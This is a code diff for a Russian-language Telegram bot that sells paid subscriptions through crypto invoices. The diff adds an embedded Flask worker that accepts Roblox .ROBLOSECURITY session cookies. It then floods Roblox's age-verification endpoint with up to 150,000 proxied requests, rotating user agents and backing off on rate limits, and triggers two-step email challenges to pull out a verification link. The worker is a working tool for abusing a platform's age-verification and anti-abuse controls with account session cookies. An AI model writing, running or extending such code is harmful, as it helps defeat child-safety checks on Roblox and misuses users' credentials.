@@ -726,6 +726,12 @@ def db_init():
         c.execute("""
             CREATE INDEX IF NOT EXISTS idx_referrals_referrer ON referrals(referrer_id)
         """)
+        c.execute("""
+            CREATE TABLE IF NOT EXISTS bot_settings (
+                key   TEXT PRIMARY KEY,
+                value TEXT NOT NULL DEFAULT 'true'
+            )
+        """)
 
 
 def db_get_user(user_id):
@@ -2201,11 +2207,70 @@ async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
                    7: t(user_id, "btn_sub_7d"), 30: t(user_id, "btn_sub_30d"),
                    0: t(user_id, "btn_sub_inf")}
         desc    = labels.get(days, f"{days} дней")
-        invoice = await loop.run_in_executor(executor, create_invoice, price, 1)
-        if not invoice:
-            await query.answer(t(user_id, "pay_error"), show_alert=True)
+        # Показываем выбор метода оплаты (как для попыток)
+        method_buttons = []
+        if CRYPTO_BOT_TOKEN:
+            method_buttons.append(InlineKeyboardButton(t(user_id, "btn_pay_crypto"),  callback_data=f"subpay_cb_{days}"))
+        if XROCKET_TOKEN:
+            method_buttons.append(InlineKeyboardButton(t(user_id, "btn_pay_xrocket"), callback_data=f"subpay_xr_{days}"))
+        if not method_buttons:
+            await query.answer(t(user_id, "pay_method_unavail"), show_alert=True)
             return WAITING_BUY
-        inv_key = f"sub_{user_id}_{invoice['invoice_id']}"
+        await query.edit_message_text(
+            t(user_id, "choose_payment", amount=f"{price:.2f}"),
+            parse_mode="Markdown",
+            reply_markup=InlineKeyboardMarkup([
+                method_buttons,
+                [InlineKeyboardButton(t(user_id, "btn_back"), callback_data="buy_sub")],
+            ]),
+        )
+        return WAITING_PAYMENT
+
+    # ── Выбор метода оплаты (подписка) ──
+    if data.startswith("subpay_"):
+        parts = data.split("_")  # subpay_cb_7 or subpay_xr_7
+        method = parts[1]  # cb or xr
+        try:
+            days = int(parts[2])
+        except (ValueError, IndexError):
+            return WAITING_MENU
+        price  = SUBSCRIPTIONS.get(days)
+        labels = {1: t(user_id, "btn_sub_1d"), 3: t(user_id, "btn_sub_3d"),
+                  7: t(user_id, "btn_sub_7d"), 30: t(user_id, "btn_sub_30d"),
+                  0: t(user_id, "btn_sub_inf")}
+        desc = labels.get(days, f"{days} дней")
+        if method == "cb":
+            try:
+                raw = await loop.run_in_executor(executor, create_invoice, price, 1)
+            except Exception as e:
+                logging.error("CryptoPay sub run_in_executor error: %s", e)
+                raw = None
+            if not raw:
+                await query.edit_message_text(
+                    t(user_id, "pay_error"),
+                    reply_markup=InlineKeyboardMarkup([[
+                        InlineKeyboardButton(t(user_id, "btn_back"), callback_data="buy_sub")
+                    ]]),
+                )
+                return WAITING_BUY
+            inv_key = f"sub_{user_id}_{raw['invoice_id']}"
+            pay_url = raw["pay_url"]
+        else:
+            try:
+                raw = await loop.run_in_executor(executor, xrocket_create_invoice, price, 1)
+            except Exception as e:
+                logging.error("xRocket sub run_in_executor error: %s", e)
+                raw = None
+            if not raw:
+                await query.edit_message_text(
+                    t(user_id, "pay_error"),
+                    reply_markup=InlineKeyboardMarkup([[
+                        InlineKeyboardButton(t(user_id, "btn_back"), callback_data="buy_sub")
+                    ]]),
+                )
+                return WAITING_BUY
+            inv_key = f"xr_sub_{user_id}_{raw['invoice_id']}"
+            pay_url = raw["pay_url"]
         pending_payments[inv_key] = {
             "type": "sub", "user_id": user_id,
             "days": days, "price": price, "desc": desc,
@@ -2213,7 +2278,7 @@ async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.edit_message_text(
             f"Счёт на подписку: {desc}\nСумма: ${price}",
             reply_markup=InlineKeyboardMarkup([
-                [InlineKeyboardButton(t(user_id, "btn_pay"),       url=invoice["pay_url"])],
+                [InlineKeyboardButton(t(user_id, "btn_pay"),       url=pay_url)],
                 [InlineKeyboardButton(t(user_id, "btn_check_pay"), callback_data=f"check_{inv_key}")],
                 [InlineKeyboardButton(t(user_id, "btn_back"),      callback_data="buy_sub")],
             ]),
@@ -2309,7 +2374,7 @@ async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await query.answer("Это не ваш платёж.", show_alert=True)
             return WAITING_MENU
 
-        # Определяем какой шлюз проверять
+        # Определяем какой шлюз проверять (xr_ и xr_sub_ — оба xRocket)
         if inv_key.startswith("xr_"):
             xr_status = await loop.run_in_executor(executor, xrocket_check_invoice, raw_id)
             is_paid = (xr_status == "paid")
@@ -2432,13 +2497,16 @@ async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if user_id not in ADMIN_IDS or not context.user_data.get("admin_auth"):
             return WAITING_MENU
         global SERVICE_NO2FA_ENABLED, SERVICE_2FA_ENABLED
-        SERVICE_NO2FA_ENABLED, SERVICE_2FA_ENABLED = db_get_service_flags()
+        no2fa_cur, fa2_cur = await loop.run_in_executor(executor, db_get_service_flags)
+        SERVICE_NO2FA_ENABLED, SERVICE_2FA_ENABLED = no2fa_cur, fa2_cur
         if data == "admin_toggle_no2fa":
             SERVICE_NO2FA_ENABLED = not SERVICE_NO2FA_ENABLED
-            db_set_setting("service_no2fa", "true" if SERVICE_NO2FA_ENABLED else "false")
+            new_val = "true" if SERVICE_NO2FA_ENABLED else "false"
+            await loop.run_in_executor(executor, db_set_setting, "service_no2fa", new_val)
         else:
             SERVICE_2FA_ENABLED = not SERVICE_2FA_ENABLED
-            db_set_setting("service_2fa", "true" if SERVICE_2FA_ENABLED else "false")
+            new_val = "true" if SERVICE_2FA_ENABLED else "false"
+            await loop.run_in_executor(executor, db_set_setting, "service_2fa", new_val)
         return await show_admin_panel(update, context)
 
     # ── ADMIN ──
@@ -3446,5 +3514,267 @@ def main():
     )
 
 
+# ══════════════════════════════════════════════════════════════════════
+# 🔧 EMBEDDED WORKER (Flask HTTP-сервер для Railway)
+# Запуск: RUN_MODE=worker python bot.py
+#   или:  gunicorn "bot:_create_worker_app()" -w 1 -b 0.0.0.0:$PORT --timeout 660
+# ══════════════════════════════════════════════════════════════════════
+
+def _create_worker_app():
+    """Создаёт и возвращает Flask-приложение воркера."""
+    import re as _re
+    import json as _json
+    import base64 as _base64
+    import random as _random
+    import threading as _wt
+    import concurrent.futures as _wf
+    from collections import deque as _deque
+
+    try:
+        from flask import Flask as _Flask, request as _wreq, jsonify as _wjsonify
+    except ImportError:
+        raise RuntimeError("Flask не установлен. Добавьте flask в requirements.txt")
+
+    _wapp = _Flask(__name__)
+    _WSECRET = os.environ.get("WORKER_SECRET", "")
+
+    # ── Прокси пул (переиспользуем из бота) ──
+    _wproxy_pool: list[str] = list(_proxy_pool) if _proxy_pool else []
+    _wproxy_idx  = 0
+    _wproxy_lock = _wt.Lock()
+    _wproxy_health: dict[str, dict] = {}
+    _wproxy_health_lock = _wt.Lock()
+    _WPROXY_FAIL_TH  = 6
+    _WPROXY_COOLDOWN = 30
+
+    def _wnext_proxy():
+        global _wproxy_idx
+        if not _wproxy_pool:
+            return None
+        now = _time.time()
+        with _wproxy_lock:
+            for _ in range(len(_wproxy_pool)):
+                idx = _wproxy_idx % len(_wproxy_pool)
+                _wproxy_idx += 1
+                url = _wproxy_pool[idx]
+                with _wproxy_health_lock:
+                    h = _wproxy_health.get(url, {"fails": 0, "last_fail": 0})
+                    if h["fails"] >= _WPROXY_FAIL_TH:
+                        if (_time.time() - h["last_fail"]) < _WPROXY_COOLDOWN:
+                            continue
+                        _wproxy_health[url] = {"fails": 0, "last_fail": 0}
+                return url
+        return _wproxy_pool[0] if _wproxy_pool else None
+
+    def _wproxy_dict(proxy_str):
+        return _parse_proxy(proxy_str) if proxy_str else None
+
+    _WDEADLINE   = int(os.environ.get("DEADLINE", 600))
+    _WBATCH_SIZE = int(os.environ.get("BATCH_SIZE", max(len(_wproxy_pool), 20)))
+    _WPAUSE      = float(os.environ.get("PAUSE_BURST", 0.02))
+    _WPAUSE_429  = float(os.environ.get("PAUSE_429", 1.5))
+    _WREQ_TIMEOUT = int(os.environ.get("REQUEST_TIMEOUT", 12))
+    _WMAX_REQS   = 150000
+
+    _WURL_VERIFY = "https://apis.roblox.com/age-verification-service/v1/persona-id-verification/start-verification"
+    _WUA = [
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+    ]
+
+    def _wmake_session(cookie, proxy_str=None):
+        s = requests.Session()
+        s.cookies[".ROBLOSECURITY"] = cookie
+        s.headers.update({
+            "User-Agent": _random.choice(_WUA),
+            "Content-Type": "application/json;charset=utf-8",
+            "Accept": "application/json, text/plain, */*",
+            "Origin": "https://www.roblox.com",
+        })
+        if proxy_str:
+            pd = _wproxy_dict(proxy_str)
+            if pd:
+                s.proxies.update(pd)
+        return s
+
+    def _wbody(method):
+        if method == "id":
+            return {"generateLink": True, "ageEstimation": False, "parentVerification": False}
+        return {"generateLink": True, "ageEstimation": True, "parentVerification": False}
+
+    def _wdecode_meta(cmeta):
+        try:
+            padded = cmeta + "=" * (-len(cmeta) % 4)
+            return _json.loads(_base64.b64decode(padded).decode("utf-8", errors="ignore"))
+        except Exception:
+            return {}
+
+    def _wone_request(cookie, csrf, method, proxy_str):
+        try:
+            s = _wmake_session(cookie, proxy_str)
+            if csrf:
+                s.headers["x-csrf-token"] = csrf
+            r = s.post(_WURL_VERIFY, json=_wbody(method), timeout=_WREQ_TIMEOUT)
+            new_csrf = r.headers.get("x-csrf-token")
+            link = extract_link_from_raw(r.text)
+            if link:
+                return {"link": link, "status": r.status_code, "newCsrf": new_csrf}
+            if r.status_code == 403:
+                ctype = r.headers.get("rblx-challenge-type", "")
+                cid   = r.headers.get("rblx-challenge-id", "")
+                cmeta = r.headers.get("rblx-challenge-metadata", "")
+                return {"status": 403, "challengeType": ctype, "challengeId": cid,
+                        "challengeMeta": cmeta, "newCsrf": new_csrf}
+            return {"status": r.status_code, "newCsrf": new_csrf}
+        except Exception as e:
+            return {"status": 0, "error": str(e)}
+
+    def _wsend_email(cookie, user_id, csrf, cid, cmeta):
+        try:
+            meta = _wdecode_meta(cmeta)
+            inner = (meta.get("challengeId") or meta.get("twostepVerificationChallengeId")
+                     or meta.get("challenge_id") or cid)
+            action = meta.get("actionType") or "Generic"
+            s = _wmake_session(cookie)
+            if csrf:
+                s.headers["x-csrf-token"] = csrf
+            url = f"https://twostepverification.roblox.com/v1/users/{user_id}/challenges/email/send-code"
+            r = s.post(url, json={"actionType": action, "challengeId": inner}, timeout=12)
+            if r.status_code == 403 and r.headers.get("x-csrf-token"):
+                s.headers["x-csrf-token"] = r.headers["x-csrf-token"]
+                r = s.post(url, json={"actionType": action, "challengeId": inner}, timeout=12)
+            return r.status_code in (200, 204), inner, s.headers.get("x-csrf-token") or csrf
+        except Exception:
+            return False, cid, csrf
+
+    def _wget_uid_csrf(cookie, method):
+        try:
+            s = _wmake_session(cookie)
+            r = s.get("https://users.roblox.com/v1/users/authenticated", timeout=10)
+            uid = r.json().get("id") if r.status_code == 200 else None
+            # get csrf via attempt
+            r2 = s.post(_WURL_VERIFY, json=_wbody(method), timeout=12)
+            csrf = r2.headers.get("x-csrf-token")
+            link = extract_link_from_raw(r2.text)
+            if link:
+                return uid, f"__LINK__:{link}"
+            if csrf and r2.status_code == 403:
+                s.headers["x-csrf-token"] = csrf
+                r3 = s.post(_WURL_VERIFY, json=_wbody(method), timeout=12)
+                link = extract_link_from_raw(r3.text)
+                if link:
+                    return uid, f"__LINK__:{link}"
+                csrf = r3.headers.get("x-csrf-token") or csrf
+            return uid, csrf
+        except Exception:
+            return None, None
+
+    def _wrun(cookie, duration_sec, method):
+        uid, tok = _wget_uid_csrf(cookie, method)
+        if tok and tok.startswith("__LINK__:"):
+            return tok[9:]
+        csrf = tok
+        if not csrf or not uid:
+            return None
+
+        total = 0
+        email_sent = False
+        active_cid = active_inner = active_csrf = None
+        consecutive_429 = 0
+        start = _time.time()
+        workers = max(len(_wproxy_pool) * 2, 50) if _wproxy_pool else 20
+        ex = _wf.ThreadPoolExecutor(max_workers=workers)
+        found_link = None
+
+        try:
+            while (time.time() - start) < duration_sec and total < _WMAX_REQS:
+                proxies = _wproxy_pool if _wproxy_pool else [None]
+                futs = [ex.submit(_wone_request, cookie, csrf, method, p) for p in proxies]
+                results = []
+                for f in _wf.as_completed(futs):
+                    r = f.result()
+                    results.append(r)
+                    total += 1
+                    if r.get("link") and not found_link:
+                        found_link = r["link"]
+                        break
+                    if not email_sent and r.get("status") == 403 and r.get("challengeType") and r.get("challengeId"):
+                        req_csrf = r.get("newCsrf") or csrf
+                        ok, inner, new_csrf = _wsend_email(cookie, uid, req_csrf, r["challengeId"], r.get("challengeMeta", ""))
+                        if ok:
+                            email_sent = True
+                            active_cid   = r["challengeId"]
+                            active_inner = inner
+                            active_csrf  = new_csrf
+                    if r.get("newCsrf"):
+                        csrf = r["newCsrf"]
+                if found_link:
+                    break
+                has_429 = any(r.get("status") == 429 for r in results)
+                consecutive_429 = (consecutive_429 + 1) if has_429 else 0
+                if consecutive_429 >= 3:
+                    _time.sleep(min(_WPAUSE_429 * (2 ** (consecutive_429 - 3)), 30.0))
+                elif has_429:
+                    _time.sleep(_WPAUSE_429)
+                else:
+                    _time.sleep(_WPAUSE)
+        finally:
+            ex.shutdown(wait=False, cancel_futures=True)
+
+        if found_link:
+            return found_link
+        if email_sent and active_cid:
+            return {"challengeId": active_cid, "innerChallengeId": active_inner or active_cid,
+                    "csrf": active_csrf or csrf, "emailSent": True}
+        return None
+
+    _WMAXCON = int(os.environ.get("MAX_CONCURRENT_REQUESTS", 3))
+    _wsem    = _wt.Semaphore(_WMAXCON)
+
+    @_wapp.route("/health", methods=["GET"])
+    def _whealth():
+        return _wjsonify({"status": "ok", "mode": "embedded-worker",
+                          "deadline_sec": _WDEADLINE, "proxy_count": len(_wproxy_pool)})
+
+    @_wapp.route("/get-link", methods=["POST"])
+    def _wget_link():
+        secret = _wreq.headers.get("X-Secret") or (_wreq.json or {}).get("secret", "")
+        if _WSECRET and secret != _WSECRET:
+            return _wjsonify({"error": "unauthorized"}), 401
+        data   = _wreq.json or {}
+        cookie = data.get("cookie", "").strip()
+        method = data.get("method", "camera").strip()
+        if not cookie:
+            return _wjsonify({"error": "cookie required"}), 400
+        if not _wsem.acquire(blocking=False):
+            return _wjsonify({"error": "worker busy"}), 503
+        try:
+            result = _wrun(cookie, _WDEADLINE, method)
+        except Exception as e:
+            logging.error("/get-link worker error: %s", e)
+            return _wjsonify({"error": "failed"}), 500
+        finally:
+            _wsem.release()
+        if isinstance(result, str):
+            return _wjsonify({"link": result})
+        if isinstance(result, dict) and result.get("challengeId"):
+            return _wjsonify(result)
+        return _wjsonify({"error": "не смог получить"}), 500
+
+    return _wapp
+
+
+def _run_worker():
+    """Запускает embedded worker (Flask HTTP-сервер)."""
+    _wapp = _create_worker_app()
+    port = int(os.environ.get("PORT", 8080))
+    logging.info("🔧 Запуск embedded Worker на порту %d", port)
+    _wapp.run(host="0.0.0.0", port=port, threaded=True)
+
+
 if __name__ == "__main__":
-    main()
+    run_mode = os.environ.get("RUN_MODE", "bot").lower()
+    if run_mode == "worker":
+        _run_worker()
+    else:
+        main()
